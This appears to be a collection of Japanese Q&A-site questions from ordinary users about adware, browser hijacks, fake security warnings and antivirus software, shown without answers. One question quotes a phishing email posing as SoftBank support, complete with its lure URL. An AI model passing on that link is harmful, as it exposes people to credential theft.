どのサイトを開いても画像の左、右下に出てくるような広告が消えません。(IE.opera.Chromeなど全てででます) プログラムのアンインストール、アドオンの確認、キャッシュの削除、ウイルスの検索、Windows起動時の自動起動アプリの確認、タスクマネージャで不審なプログラムの起動を探す、など検索して出てくるような事は大抵試しましたが消えませんでした。最終的にほとんどのプログラムを消してしまって治らないので全て復元して元に戻したました。 どなたか最新(症状は先月からなので)のこういった事情に詳しいサイトや、治しかたのわかる方はいませんか？ よろしくお願いいたします。 (画像の広告の下にADS bymakingAppと書いてあります。)
ウィルス感染に関連する質問です。 　わたしはアサヒネットフリーアドレスを利用してホームページを開設していますが、昨日（5/17）から私のホームページサイトが「既知の悪質なｗｅｂサイトﾄ」と表示されるようになりました。 　この表示はNorton Internet Securityによるものです。 　ウィルスチェックの結果、私のホームページを構成するファイルにウィルス感染は認められませんでしたが、障害の詳細表示を見たところ、私にとって未知のサイトにTrojan.Gen.2が潜伏？していると示されます。 　当該サイトと私のサイトは、次の共通のアドレスを用いていることだけがお互いがむすびつく共通事項です。当該サイトにはこれまでアクセスしたことも、なんらかのファイルをダウンロードしたこともありません。 　www.ne.jp/asahi/･･･　です。 　念のため、先のアドレスを用いている他のホームページにアクセスしたところ、いずれも「既知の悪質なｗｅｂｻｲﾄ」と表示されます。 　以上により、サーバーから私の関連ファイルすべてを削除しまたうえで、アサヒネット技術サポートにもメール及び電話で連絡を入れていますが、反応が鈍いように思えます。アサヒネット公式サイトにも通知を行って24時間以上たってもアナウンスがなされていません。 　このため、上記の現象が私だけの環境で発生しているのかどうか確認させていただきたいのです。 　私と同じ、アサヒネットフリーアドレスHP（www.ne.jp/asahi/･･･）をご利用の方、ご自分のサイトにアクセスして正常に接続できるかどうか状況をお教えいただけないでしょうか？　 　以上よろしくお願いいたします。
かなり不安になってきました。 パソコンの起動音やエラー音がいつのまにか変わっているのです。 調べたら「ウインドウズ標準」の設定が、いつのまにか「風景」のサウンドに 変わっていました。 このパソコンは私以外に触る事はありえません。 となるとウイルス？ ウイルスと関係あるかどうかわかりませんが、 思い当たるのは、最近 無料で見れる動画、pandora TVとか MIOMIO など韓国語のサイトにアクセスして 映画とか見てしまって そのせいではないか とも思えてきました。 このパソコンでは よくITバンキングやクレジットで買い物してるので 個人情報を読み取られたら大変な事になります。 どうか教えてくださいませ
goo 2段階認証の登録を進めようと思うのですが、gooID2段階認証の資料が多く、コピ－をとって調べるのでがあまりにも資料が多く、どれから手を付けたらよいのか、わからず困っています。 ２段階認証関係の登録について必要手続はどれか、ご指導願います。
windows7のPCで５月７日頃Dropboxを使ってみたいと思い、正規サイトよりダウンロードした所、メールボックスに『dropboxのダウンロード完了まであと少しです』というメールが届いたので記載のアドレスをクリックした所、パソコンの挙動がおかしくなりました。ボタンもカーソルも再起動も反応しなくなったり、Wordの文字が二重に滲んだりします。ウィルス感染だと考え、ノートンパワーイレイサーを使いましたが、maputil.exeが削除されたとの表示が出て、PCが元通りに復調しません。maputilが破壊されるとセキュリティホールが発生するとあったのでますます心配です。 ウィルス削除の方法と、今あるパソコンのファイルをどうすべきかご教示お願い致します。
ウイルスバスタークラウドのパスワードを忘れてしまい、「登録したメールアドレスにパスワードを送信」をクリックしたところ、メールアドレスを間違って登録していたようでメールが届かなくなっていました。 メールアドレスの変更の仕方がわかりません。どなたかわかる方いらっしゃいませんか？
プロバイダの迷惑メール対策ツールと他の例えばウィルスバスターとの併合、同時に使用している場合、お互いに干渉して重くなるだけではなく、他に何か不都合がでるのでしょうか。それとも気にしないでいいでしょうか。
有料サイトから突然請求が来ました。無視したいのですが、PC上の画面が消えません。どうすればよいですか
有料サイトから突然請求が来た。どうすればよいか
パソコンがどうも重かったり、広告や警告ばかりでるので色々と調べたら、Mirarというのに引っ掛かってるみたいです。 コントロールパネルからMirarの削除を試みると getmirar.com というのが左上に表示されたページに移り あとは空白です ここからどうするかわかりません… だれかアドバイスお願いいたします!!
ある日私はコンピュータを使っていたら　ウイルスにかかりました、そのときちょうど私はアダルト画像を見ていました　その画像を(snipping tool)と言う画像を切り取りそしてコンピュ―ターのデータに、入れると言うアプリですそれしたせいか、ウイルスがかかってしまいましたパソコンは新品で対策もなんもしてませんお試し版とかもうすぐ切れるんで誰か助けてください！！アプリの無料版とかでインストールしてもいけるんでしょうか？購入版はクレジットカードの番号が読まれそうなので、とにかく誰か助けたください！！！！！！！！！！！！！
前回の質問で、「パソコンで、マイクラとかの動画や、配布ワールドの入れ方等を調べていると、勝手にアダルトサイトや「人生に一度は不倫してみませんか」と書いてあるサイト、ＤＭＭのエロアニメサイト、Remageというｐｃエラー修復！とかのサイトが、Chromeを使っていると開きます。中には海外のサイトも含まれます。いろいろ調べましたがどの方法もまったく効果なしでした。以前友人が遊びに来たとき、このPCでＸビデオなるものを見ていました。また、いろんなアダルトサイトを見ていました。登録等はしていないのですが、どうすればいいでしょうか。手順等も細かくお願いします！急いでいます！！」という質問をしました。そのアダルトサイトの例が添付画像のようになります。対策方法をお教えください！！！
2ch.scというサイトは安全ですか？ 書き込みしたり、アクセスすることによって、何か危険なことが起きたりしますか？
PC（windows8.1)にads by buyfastが侵入しいろいろ邪魔をします。退治する方法を教えてください。
パソコンで、マイクラとかの動画や、配布ワールドの入れ方等を調べていると、勝手にアダルトサイトや「人生に一度は不倫してみませんか」と書いてあるサイト、ＤＭＭのエロアニメサイト、Remageというｐｃエラー修復！とかのサイトが、Chromeを使っていると開きます。中には海外のサイトも含まれます。いろいろ調べましたがどの方法もまったく効果なしでした。以前友人が遊びに来たとき、このPCでＸビデオなるものを見ていました。また、いろんなアダルトサイトを見ていました。登録等はしていないのですが、どうすればいいでしょうか。手順等も細かくお願いします！急いでいます！！
最近、PCの画面に勝手にウィルス駆除に関する警告のポップアップウィンドウやその他広告のウィンドウがうるさく出てきてかないません。更には、ネットで今見ている画面から勝手に関係の無い広告画面にとんでしまったりも頻繁におこります。 自分で設定をいじった記憶はないのですが、これを防ぐ方法は無いのでしょうか。 PCは３台使用していますが、この現象はその中の１台でのみ起こります。 OSはウインドウズ８でセキュリティーはウィルスバスターを入れております。 初歩的な質問かもしれませんが、PCには詳しくないものでわかりやすく教えて頂けるとありがたいです。
YAHOOのフリ－メールですが　WindowsLive mailを使い 受信しています、Livemailで受信拒否するのですが、 Yahooの迷惑メ－ルフォルダーに受信されます。 受信拒否のものとは別ですが、そちらも受信拒否しても着てしまいます このような状態はどのように解決すればよいのでしょうか？
アンインストールしようと思ってコントロールパネルを開きましたが、「Dealply」がなく困っています。 何か方法はありますか？
MacでSafariを使っています。 「警告！ Media Playerを早急に更新する必要があります」 という警告窓が出て、どうしても消せません。 どうせフィッシングだと思うので、OKボタンは押さずに再起動などかけますが、 消えません。 Chromeの検索で調べて、「知らない間にインストールされたアドウェアは「AdwareMedic」で削除しよう」 と言うのがあったので、「AdwareMedic」をインストールしてスキャンしたら、怪しげなのがいくつか見つかったので即削除しました。 で、再起動しても例の警告窓は消えずにいます。 safariの「機能拡張」「環境設定」「safariのリセット」などもグレーでいじれません。 「履歴」で削除しようとしましたが、これもグレーでいじれません。 何か策はあるでしょうか？ よろしくお願いします。
ポップアップ広告を表示前に自動削除する方法を教えてください。
DeepBurner　というＤＶＤに焼くフリーソフトをダウンロードした際、istartsurf　というウィルスを感染させられました。有名（出回っている）らしいですね。 それで、最終的には firefox　の「それでも解決しない場合」で紹介されていた無料の除去ソフト　Malwarebytes　をダウンロード・実行し、一応除去出来た＝firefox　正常画面に戻る　、となったのですが。。 気になっているのは。　そのマルウェアバイツ　の場合、スキャン時間約３０分、感染の数・約２００、スキャンした数・約４０万台。　だったのですが。 その前に、スパイハンター４　というフリーソフトで試みた際は、スキャン時間約１時間数十分、感染の数・８１１、スキャンした数・約９０万台。　と出ていました。 何故、違うのでしょうか？　そもそも検索にかかる時間が約３倍違います。 それでも、とりあえず　firefox の画面は正常に戻ったから良いのですが。 スパイハンター　の方が説明＝表記　が丁寧で。　パソコン内の自分のファイルに色々感染している事が分かりました。　つまり、マルウェアバイツ　によって「完全に除去出来たのか？」という心配です。 ちなみに、先に使用した　スパイハンタ４の方は、スキャン「終了後」３９ドルかかる→振り込んで。 と出てきて。 しかも、クレジットカード　か、ペイパル　のみ。だったため、私には不可でした。 このような問題、くわしい方（でなくとも）、有益な情報　ご存知の方、教えて下さい。 結構、ホントに心配な上、　今回、疲れました！！ フリーソフト関連の問題→除去不可　は、今回で２回目だったので。　こののち、フリーソフトをダウンロードするのが怖く、かつ嫌になりました。　いちいち有料のを買わなければいけないのか・・
昨年秋に自宅のネット環境をA社からＢ社に切り替えました。 Ｂ社にはセキュリティソフト（マカフィー）が月々の請求金額に含まれているので この３月末で、ウイルスバスターの契約期間が切れるのと同時に、これをアンインストール してマカフィーに切り替えました。 ところが、マカフィーは「重い」のか、全体的に明らかにレスポンスが悪くなりました。 何か少しでもレスポンスを早くする工夫はないものでしょうか。 ＰＣの使用に関しては、諸般のＨＰを見るのが主で、もちろん、パワポ、エクセル ワードで資料作成もしますが、それ以上に複雑な何かをすることはありません。 場合によってはマカフィーをやめて、敢えて新たにウイルスバスターを購入して インストールすることも考えています。 これをせずにマカフィーの負荷を軽くする方法があればどなたかご教示願います。
2014年4月にウィルスバスタークラウド１年版（３台まで）を購入し、２台へインストールしました。 一年が経ったのでまた購入するつもりだったのですが、ふと、昨年の１台分が余っていることに気づきました。 昨年インストールした２台のうち１台へ、この余り１台分をインストールすることは可能でしょうか？ （更新通知がポップアップが出て、更新をクリックしたら購入画面へ行ってしまうので、あまりの１台をインストールするには一度削除してからでないとできない？） ご回答を宜しくお願いします。
先日アクセスしたサイトがトロイの木馬を感染させる可能性があったらしいのですが、サイトにアクセスしただけでダウンロード等しなくても感染したりするのですか？ノートンの完全スキャンとパワーイレーサーで検出されなかったのですが大丈夫ですか？。
警告の広告が出るのですが、どうすればいいでしょうか。 あまりPCに詳しくないためわかりやすく教えてください。 よろしくお願いします。
パソコンのスタートボタン押して、なにかファイルを開いたら、アドレスバー？みたいなところが出たり消えたりして、コントロールパネルとかがいじれないんです。 まずクリックできません。 他のゲームとかサイトを開くと｢ウイルスに感染しています！｣の広告が３、４個ぐらいでてきます。動作も遅いですし、ウイルスだと思われるんですが、これは対処できますか？(パソコン超初心者です) 長文申し訳ございません！
DELL Inspiron1501 Windows7 おそらくウィルスと思うんですが、次々に画面に現れてインターネットの邪魔をします。 kingソフトの無料版を使っていますが見つかりません。 実はインターネットのプロバイダーに遠隔操作でかなり長い時間見てもらいましたが ウィルスは見つかりませんでした。 怪しいと思われるものはすべて削除してもらいましたが インターネットを立ち上げるとまた出始めます。 そのほとんどがパソコンのスピードを上げます、というようなものです。 こうした場合、どうやればいいでしょうか。 リカバリーCDをなくしていて、OSの再インストールはできません。 VISTAに落としてでも普通に使えればいいんですが。 よろしくお願いします。
このような警告があるのですが、よくわかりません。 ウイルスでしょうか？対処方法を教えてください。 よろしくお願いします。
SOURCENEXTの「ウィルスセキュリティ」で、手動ウィルス検査をすると、いつも次の検査結果が出ます。これは、放って置いていいものでしょうか。駆除の方法はないものでしょうか。 ーーーーーーーーーー ウィルス検査の内容 詳細　　　　　C:\Fujitsu\Bundle\VBUSTER\Setup\SupportTool\64bit\TISTool\64bit.7z 問題の詳細　　圧縮ファイル内に暗号化されたファイルが含まれています。 ステータス　　未処理（駆除することができません。） ーーーーーーーーーー
【ソフトバンクをご利用のお客様】 メールボックスがいっぱいだった為、サポートセンターにてお預かり中のメールが御座いますのでご確認お願い致します。 ▽確認はコチラ http://hh18em5.humanswalot.net/hzS/6nxs0AB4MI0b2 … 【カスタマーサポート】 このようなメールが昨日届き開いてしまいました。 一回目は慌てて閉じたのですが、気になってもう一度開こうとしたのですが、「現在サーバーが混み合っております。:2」と表示され開けません。 カードの情報など盗まれていないか心配です…。 同じメールが来たなど、わかる方いらっしゃいませんか？ 対処法を教えてください。よろしくお願いします。
Google Cromeを開くと画像のような警告画面が出ます。 おそろく詐欺POPなのは理解してるのですが消し方が分かりません。 昨日まで何もなくて今日になってこのような表示になって困っています。 昨日以前に復元すべきなのでしょうか？ しかし昨日何もインストールなどしていませんし、ここ最近はネット閲覧だけで 何もしていません。これはCrome側がおかしいのでしょうか？
こんばんわ ノートン360のユーザー登録を今すぐ実行せず＂×＂後ユーザー登録するにはどうすれば 良いですか。パソコン初心者なので、分かりやすくご説明願えれば助かります。
私の勤めている会社では、ある種の情報を他の会社とUSBメモリでやりとりしているのですが、やりとりをするたびにUSBメモリにクイックフォーマットをかけ、ESET Endpoint Antivirusとウイルスバスタークラウドの２つのソフトでウイルスチェックをかけております。 その作業を私が担当することになったのですが、２つのソフトでチェックしなくても同等以上のチェック効果を出せるソフトなどはありますか？ また、ESET Endpoint Antivirusとウイルスバスタークラウドのどちらから先にチェックをかけるとより効果があるといったことはありますか？
【環境】 Windows７ SP1　64bit版 使用しているウイルス対策ソフトは無料体験版ノートン360 【症状・経緯】 メインで使用しているPCがルートキット型ウイルスに感染→ローレベルフォーマット後にOSを再インストール→Microsoftアプデ＋ノートンをインストールしてライブアップデート→ 外付けHDDにちょっとしたツール類・リカバリ後に入れるべきソフトを記したテキストメモ等があるので外付けHDDを繋いでそれらのソフトを導入。 あらかたソフトウェアをインストールしたのでEaseUS Todo Backupでリカバリファイルを作成する前に念の為にOSのドライブのクイックスキャンを実行。脅威は検出されず。 そこでついでに外付けHDDをクイックスキャンしたらW32.HLLW.Antinnyを①個検出致しました。 ウェブで検索すると低レベルと書いてありましたが検出したノートンでは脅威（高）となってました。 ずっと昔にWinnyを使用した経験はありますが、今はありません、今後この先使用することもないと思います。 【質問】 ①ノートンの解決済みとは該当のファイルを削除したという意味ですか？それともどこかに隔離して動かなくしただけなのですか？使用頻度の高いプログラムを導入したOSのバックアップのイメージファイルを取る際に隔離したウイルスまでバックアップを取らないか心配です。 ②この状態でリカバリのイメージディスクを作成してよいものでしょうか？時間をかけてローレベルフォーマットまでしたので外付けHDDを繋げただけでまた最初から行うのも躊躇するので安全性についてお尋ねしたいです。 作成する前に導入したいソフトを自分でサイトから探して一つずつ導入するのも考えたのですがいささか量が膨大過ぎて外付けHDDに入ってるソフトやツール類をスキャンして汚染されてなければ大丈夫だろうという認識でした。
Mozilla Firefoxを使用しています。 画像のとおり、文字を入力する枠に文字の入力を試みると自動で見たことの無いものが表示されます。 これは、ウイルスに感染しているのでしょうか。 何原因か、非常に困っております。 何方かご存知の方おりましたら教えていただけないでしょうか。 よろしくお願いいたします。
Mozilla Firefoxを使用しています。 画像のとおり、赤枠の広告が勝手に表示されます。 これを非表示にする方法を何方かご存知の方おりましたら教えていただけないでしょうか。 よろしくお願いいたします。
ノートンのライブアップデートでパッチが利用可能とでたので今すぐ適用を押しました。しかし実行中のアプリケーションを終了してますという画面でキャンセルを押して、その時の画面にキャンセルを押した場合次に再起動したときにパッチが適用されると書いてありました。 そこでパソコンを再起動しましたがパッチを適用しましたと出ないのですがパッチは適用されたのでしょうか？
突然音が鳴ってびっくりしてます。 ウィルスに感染したんでしょうか？ http://neet.co.jp/trlster.jpg
パソコン（LaVie）を買って6年以上が経ちます。 以前はよくパソコンを使っていましたが、最近はネット速度が遅いためあまり使っていません。 １つのウィンドーを開くのに5分くらいかかっています。 ウイルスバスター（月額版）でウイルスチェックを自動で行ったあと、必ずcookieかスパムの削除があります。 ネット速度が遅いのは、 ◆cookieやスパムが原因 ◆ゴミ箱にゴミをためすぎが原因 あとはどんな原因が考えられますか？ また少しだけ速度を速める方法は何かありますか？
norton internet security を自動更新にしています これを解約したく noton のアイコンをクリックしているうちに 解約の画面が出ましたので「お気に入り」に入れたのですが 出てきませんで「ノートンツールキット」では 何処に進めばよいのか解りません 解約の手続を教えてください 最終的には電話をすれば宜しいのでしょうが pc は vista です
PCに有料版のウイルス対策ソフトを導入しようと考えています。 特に人気のウイルスバスターかeset ファミリー セキュリティの どちらかを導入しようかと思っているのですが、 やはり価格が高いだけにウイルスバスターのほうが優秀なのでしょうか。 もしくは別にさらに優秀なソフトがあったりしますか？ 皆さまのお考えをお聞かせいただけたら幸いです。
検索してもよくわかりませんでした。 一応、限定にして、とある人のメールだけ、編集可にしました。 とある人にだけ、メールで、ファイルへの、リンクを貼りました。 でも、URLがあって、カナリ長いランダム文ですが、他人に解析されて、利用される恐れはないのでしょうか？ それなら、ドライブからファイルをあとで削除した方が良いのでは？
お世話になります。 Win XP SP3 で Avast の無料版を使っております。 この Avastを[セーフモード]で実行しても 「サービスが停止しております」と表示されて実行できません。 [管理ツール]→[サービス]で [Avast Antivirus]を[開始する]をクリックしたところ 「エラー1068：依存関係サービスまたはグループを起動できませんでした」 と表示されました。 Avastをセーフモードで実行したいのですが、どこが悪いのでしょうか？ [F8]→[セーフモードとネットワーク]でやっても同じでした。 どなたかお分かりの方がいらっしゃいましたらお教え下さい。 よろしくお願いいたします。
今回、スーパーセキュリティにてadware.MultiPlug.GEのウィルスファイルを検出したと出たのですが、これは消去すべきなのでしょうか？ 今まで、誤作動があったのでもしかしたら違うかもしれないと思ったので質問しました。 回答よろしくお願いします。
ウィルスが入ったのか、最近、パソコンの画面に変な広告が表示され、非常に見づらく困っています。 今使っている検索ソフトはグーグル　ｃｈａｒｏｍｅです。 　検索をしようとすると画面の左下、下、右下に広告が表示され、チラチラして目ざわりです。 どうすれば、これらの広告を除去できるのか。詳しくご教示いただけないでしょうか？
ＯＳがWindows8・1で無線ランで使用しています。 ネットバンクを３つほどやっており良く資金の出し入れします。 そこで質問です。 現在セキュリティーソフトですが、ESETを使用しています。 他、無料のMCAfeeの無料を導入しています。これはとても良い です。 ESETは、ネットバンク系が弱いとの事で、ネット銀行関連のセキュ リティーで、ゆうちょ→　phishwaii　UFJ→　rapportを導入しました。 かなりPCが強個になったのですが、ごちゃごちゃ入れすぎたかなと思い 2・3日様子を見てたのですが、PC環境には問題有りません。 今現在　PC環境に問題はないのでこのまま様子を見て全部導入したままでも 大丈夫でしょうか？ MCAfeeだけで大丈夫と言われる事も有りますが、人によりけりです。 このままだとごちゃごちゃ多すぎていずれ衝突してしまう可能性が高い でしょうか？ すみませんが、ご意見をお聞かせください。
最近自宅PC(Windows 8.1)をいじったりしていると、使っている方ならわかると思いますが いくつかのウインドウを開くとそれが下のタスクバーで一つのまとまりになり、 そのアイコンの上にカーソルを合わせると今まで開いたページが縮小版で出てくるのですが それを見ようとした瞬間急にPCが固まり、あれこれとウインドウを動かしたりしないと 元に戻らないというわけのわからない現象に見舞われています。 それ以外にもいきなり固まったりとかしてかなりウザイです。 心当たりとしては、shadowplayというキャプチャソフトをインストールして使おうとしたのですが その時にいろいろインストールして その後こういった減少に見舞われるようになったのではないかと思うんですが・・・ 特に内蔵ハードディスクの容量がいっぱいいっぱいだとか、そういったことはないです。 もしかしてマルウェアだかウイルスだかなんでしょうか？ どなたかお詳しい方、ご回答よろしくお願いしますm(_ _)m
マンション管理組合の集会室に組合理事用に１年前にPCを導入しました。ウイルスチェックソフトはノートン１年ものCDを購入してインストールしました。１年経ち、利用期限が来た当日それと気付き、あわててノートンの３年ものCDを買い、インストールしました。個人情報などのファイルがあるんで冷や冷やものでした。ところがその数日前の会議で大手ソフト会社勤務の組合員の方が出席し、ノートンよりもトレンドマイクロの方が動作の軽さの点でいいとの発言がありました。今回、緊急で購入したので一応量販店に「ウイルスチェックのトレンドマイクロ下さい」というと店員はそんなソフトは知りませんと。（実は恥ずかしながら私はトレンドマイクロというのがウイルスバスターであることをその時点でしりませんでした）急いで買わねばならないので世界市場をリードする製品のひとつのノートンだから大丈夫だろうと思い、ノートン３年ものを買った次第です。管理組合なのでクレジットカードがないのでインターネットでダウンロードできないのでCDを買わざるをえませんでした。ところがノートンを購入し、インストールしたことを理事会メンバーにメールで通知すると「トレンドマイクロのウイルスバスターの方が動作が軽いので推奨したはずです。ノートンでは重くて業務に支障が出るかもしれませんが購入したのならもうどうしょうもないですね。使うしかないです。」とのソフト会社勤務の組合員のメールが関係者に同時配信されました。ノートンもウイルスバスターも動作がそんなに違うのでしょうか。ノートンは業務に支障が出るくらい遅い反応なのでしょうか。これまで１年間使ってそんな場面は一度もありませんでした。大手ソフト会社の職場はファイアウォールの中の環境でしょうし、また業務用であれば動作が早くなるようにその業務に適したカスタマイズしているのではないでしょうか。管理組合のPCは素人が簡単なExcelでの作表、Wordでの文書作成、そしてインターネットで時々情報収集するくらい。使用者もブラインドタッチが出来るような人もいません。ウイルスチェックソフトの動作が重いからよくないと本当にノートンはウイルスバスターと比較して言えるのでしょうか？それも業務に支障がでるほど。。。。最悪、責任を取って自腹でウイルスバスターに取り換えないといけないかなとも考えています。公平に比較できる立場からの適切なアドバイスよろしくお願いします。
OSがwindows8・1で、無線ランで使用していてセキュリティーソフトはノートンの３年版を使用していました。 このたび不具合が起きまして、Windowsupdate後にネット通信には問題無かったのですが、ノートンの影響でネット接続が半日できなく、Outlookの送受信やプリンターの印刷もできなくなりました。 そこでノートンをアンインストールし、代わりに無料セキュリティーソフト❝アバスト❞をインストールしましが、状況は極めて良好になりました。 ノートンは今までの２年間で不具合になる事が多々あるので二度と使いたく有りません。 ウイルスバスタもノートン同様不具合が起きやすいと聞いた事が有ります。 今の所、❝アバスト❞は重くもならず、良好です。 そこで質問なのですが、Windows8・1に対して無料の❝アバスト❞は、セキュリティー面で、安心なのか少し不安です。 Windows8・1はWindowsのセキュリィティーが強いので、有料のセキュリティーソフトでなくても大丈夫と聞いたのですが・・・。 ネットバンキングなども行ってる為、マルウエアなど心配しているのですが、他のセキュリティーソフトにした方が良いでしょうか？ ネット接続できなくなったりする不具合の起きにくい、お勧めのセキュリティーソフトがあったら教えて下さい。
あるサイトでNortonの「侵入の試みを遮断しました」という通知が２つ出ました。 そして調べてみたところadobe flashとブラウザを狙った攻撃だったようです。完全スキャンやパワーイレーサーはやりましたが異常なしです。しかしウイルスに感染してるか不安なので質問しました。※PCには詳しくないです。
インターネットをしていてあるサイトをクリックして数秒後にノートンが「○○による侵入の試みを遮断しました」(２つ)とでました。そしてすぐに戻るボタンを押し、詳細を見て対応の必要はないと書いてありました。 一応フルスキャンとパワーイレーサーをやりましたが問題はありませんでした。 今のところ何も起きてないように思うのですが、特に問題はないでしょうか？またやっておきたいことはありますか？ちなみにPCには疎いです。
先日からPCの動きが重く、DMMエ○動画サイトや他のページに勝手に移動してしまいます。 思い当たるのは ・私のPCで、彼が割れ行為をしていること。 ・無法恥態・催眠術を試したら同じマンションの爆乳人妻が俺のものになった・セックスプレイ動画1・00・真剣で私に恋しなさい!A-1 などです。 無法恥態・催眠術を試したら同じマンションの爆乳人妻が俺のものになった・セックスプレイ動画1・00・真剣で私に恋しなさい!A-1 これらがDLされているのを知ったのは、さっきたまたまコンパネのプログラムを開いたからでした。 PCに詳しい人、教えてください。どうやったら勝手にページが飛ばなくなりますか？ また、皆さんにお聞きしたいです。 彼が帰宅するまで待って問いただし彼に解決させたほうがいいのでしょうか？ 彼自身、仕事を辞めて週何日かのバイトしかしていないので暇なのはわかりますが、私が週６で働いている間にこのようなもので遊んでいるのは本当に不愉快です。 正直、いい加減にして欲しいです。 治らない場合、彼に今と同じスペックで私が気に入るPCを弁償させようと思っていますが、可能でしょうか？ 長くなってしまいましたが、よろしくお願いいたします。 読みにくい文書をここまで読んでいただきありがとうございます。
タイトルのように一太郎ファイルに種々のパスワードを書き込んで、 一太郎ファイルをひらくパスワードを設定し、そのファイルにさらにファイルロックという ソフトでパスワードをかけています。 この場合でもパスワードが盗まれますか？
カスペルスキー2013を使っているのですが、2015にアップグレードしないと危ないですか？ 2015年版にするにはお金がかかるのでしょうか？ まだ600日くらい残っているのですが。
あるゲームのMODツールをダウンロードしたのですが、自分はESETを使っていて、 脅威があるプログラムとして隔離されました。 どうしても必要だったので他のサイトの同じようなファイルもダウンロードしてみましたが、 やはり隔離されてしまいます。 そこで結構信頼性のあるVirusTotalにて一番低い検知数のファイルを検知したところ、 全体では57のウイルス対策ソフトのうち、自分の使っているESETを含む18の ウイルス対策ソフトがこのファイルは脅威があると検知されました。 分子が一桁やESETで無検知なら比較的安全かもと思うのですが、 今回の検知数の18/57の場合、このファイルはどの程度危険性があるのでしょうか？ 詳しい方が居られましたら回答をよろしくお願いします。 補足ですが、必要なのでESETではこのファイルを除外リストにいれて使っていますが、 今のところこれといった変化はありません。 これから、このファイルがパソコンに悪さを働く可能性はどのくらいあるのでしょうか？ 合わせて回答をよろしくお願いします。
ＮＥＣノート　LL550（8年前購入）Vista　で最近まで特に問題なく使用していました（アンチウィルスはバスター使用） 自分では全く分かりませんでしたが、ウィルスに感染している可能性（大量に発信しているから）を指摘されました（確信はありません）。このためすぐネット接続を中止しました（今も中止中）このため ①ネット接続しもう一度バスターで検索する ②セットアップディスクでハードを元に戻す を考えたのですが、購入時にセットアップディスクを作っていません、今からディスクを作るにしても感染していたらダメですよね。今後どうしたら良いかお知恵貸してください。廃棄も仕方ないですが、勝手ですが未練もあります（涙）
質問です。 パソコンのウイルス感染についてです。 USBメモリがウイルスを持っていたとして他のパソコンでそのUSBを使用し、 パソコンがウイルスに感染してしまったとします。 そうしたらUSBのウイルスは残ったままなのでしょうか？ 消えることってあるのでしょうか？ よろしくお願いします。
こんにちは 無料のキングソフトアンチ・ウイルスというウイルス対策ソフトをずっと前にダウンロードして使っていますが、今確認したらネットに接続してすぐにking soft antivirusの動作を終了しましたと出ます。 なんか強いウイルスの影響でキングソフトが機能していないぽいのですが。どうなんでしょ 不具合は結構あり、ネット使っているとフリーズ、やたらは反応が遅い、文字を入力しても１分くらい反応ないとか明らかにパソが異常です^^; シナ人企業のlenovoのノートパソコン使ってます。単なるせってミスでアンチウイルスソフトを起動しない設定になっているだけなら設定いじるだけですが、無料ということも有り、有料ソフトに切り替えたほうがいいならそうしたいです。 アドバイスお願いします。
お恥ずかしながら、1月に買ったパソコンを本日まで、モデム直結でインターネットしてました。 さっきルーターを導入しましたが、導入するまでの間、このパソコンはどのくらい危険だったのだろうかと不安です。 セキュリティソフトは入れており、最新版のノートンで、ファイアーウォール機能なども一応あります。 ルーターとセキュリティソフトがある状態でも、ネットには危険やリスクがあると思います。この危険度を1としたら、ルーターなし、セキュリティソフトのみのときの危険度はどれくらいに跳ね上がりますか？ 終わってるでしょうか
excel sheet 1 に 1,000 名ほどの住所録があります この一部分 20 名ほどの住所を別の sheet 2 等に コピーをしたいのですが方法を教えてください 目的はこの 20 名程の人のラベル印刷することです 宜しくお願い致します
ある動画が載せてあるサイトで動画を再生していると広告等のサイトに飛ばされます。 これは商売に結びつけようという事だと思うので、よくあることですが、ちょっと危険かなという 状況に遭遇しました。 其の時は、ブラウザ→cromeでuser agent switcherという拡張機能を使ってuser agentをiphoneに して動画の載せてあるサイトを見ていたのですが、いつもの様に違うサイトに飛ばされたのですが、 勝手にスマホのアプリらしきファイルをダウンロードサせようとして来ました。 たまたま画面をキャプチャーしていたので、キャプチャー画面を添付します。 大元の動画サイトを見るだけでも危険でしょうか？宜しくお願い致します。
先程Google chromeを立ち上げたところ、luckysearchesというサイトにばかり繋がるウイルスに感染していることがわかりました。 アンインストールしても解決されずに本当に困っています。。。。 昨日に、同様の質問をされている方がいらっしゃったのですが、自己解決されたみたいで、、、どなたか助けて頂けると幸いです、、、
NTTコミュニケーションズのサービスで Arcstar IP Voice と 光コラボ がありますが 違いは何ですか
HPを開くたびにメッセージが出ます。 ”pixel.adsafeprotected.comからjload.jsを開くか、または保存しますか？” 開く、保存、キャンセルのボタンがありますが、キャンセルしても次のHPを開けばまた表示されます。 これは、なんでしょうか？ 表示されない方法があれば教えてください。
youtubeで音楽聴いてましたが 音が聞こえなくなり音量上げると消音になり ミユウトにすると解除になります 聞こえる方法教えてください よろしくおねがいいたします
非常に困っています。数日前に音楽ソフト用のフリー音源をダウンロードしたところ、MacKeeperを誤ってダウンロードしてしまったようです。最初はきづかなかったのですが、今日は　黄色と黒の工事看板のような絵とともに、Mac OSが危険な状態ですのようなメッセージとクリックを促すような画面が出ました。クリックはしませんでしたが、、、。現在の症状としては、①ホームページを見ていると勝手に広告が現れる、②you tube の動作が重くなった、以上の症状で解決できた方！ぜひご教授願います。このままにしておくとMacの中のデータ等がきえてしまったりするのでしょうか？Mac OS 10.9.5です。Time machineはつかっています。
約2年前にパソコンと一緒にMcAfeeのウイルス対策ソフトを購入しましたが、年一回の更新料が不要なので解約したいです。 ホームページから調べてみても分かりにくく、電話番号も分かりませんでした。 平日しか対応してないようなので、問い合わせ先等ご存知の方いたら教えてください。
ウイルスバスターを通して、個人情報や大事なパスワードを入力する行為は安全でしょうか。安全なサイトだとわかり次第、ウイルスバスターから普通のブラウザに切り替えて、個人情報やパスワードを入力した方が、より安全でしょうか。
セキュリティソフトをいれてるのですが、警告文が表示されたにみかかわらず、あるサイトにアクセスしてしまいました。 ウィルスに感染してしまったでしょうか？不安でたまりません。ipad miniを利用しております。
Norton Internet Securityのパネル画面から「サポート」→「サポート情報」をクリックするとノートン自動修復が起動しますが、いつも修正箇所がひとつ表示され、「インストール」が「修復完了しました」と表示されます。 とくに不具合はないのですが気になりますよね。
